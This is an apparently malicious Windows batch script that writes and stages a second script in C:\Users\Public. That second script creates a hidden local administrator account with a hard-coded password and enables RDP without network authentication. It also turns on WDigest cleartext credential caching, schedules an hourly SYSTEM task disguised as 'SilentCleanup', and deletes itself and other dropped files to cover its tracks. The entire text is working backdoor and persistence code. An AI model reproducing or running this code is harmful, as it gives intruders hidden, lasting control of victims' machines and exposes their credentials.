@echo off
echo NET USER Admin_env$ P@ssw0rd! /ADD /expires:never >> C:\Users\Public\N1F10.bat
echo NET LOCALGROUP Administrators /ADD Admin_env$ >> C:\Users\Public\N1F10.bat
echo REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v Admin_env$ /t REG_DWORD /d 0 /f >> C:\Users\Public\N1F10.bat
echo REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >> C:\Users\Public\N1F10.bat
echo REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d 0 /f >> C:\Users\Public\N1F10.bat
echo REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f >> C:\Users\Public\N1F10.bat
echo REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f >> C:\Users\Public\N1F10.bat
echo NET LOCALGROUP Administrators /ADD Admin_env$ >> C:\Users\Public\N1F10.bat
echo schtasks /create /tn SilentCleanup /tr "C:\Users\Public\mi.bat" /sc hourly /ru SYSTEM >> C:\Users\Public\N1F10.bat
echo schtasks /run /tn SilentCleanup >> C:\Users\Public\N1F10.bat
echo cmd.exe /c DEL C:\Users\Public\N1F10.bat >> C:\Users\Public\N1F10.bat
echo cmd.exe /c DEL C:\Users\Public\FM.txt >> C:\Users\Public\N1F10.bat
echo cmd.exe /c DEL C:\Users\Public\FM.exe >> C:\Users\Public\N1F10.bat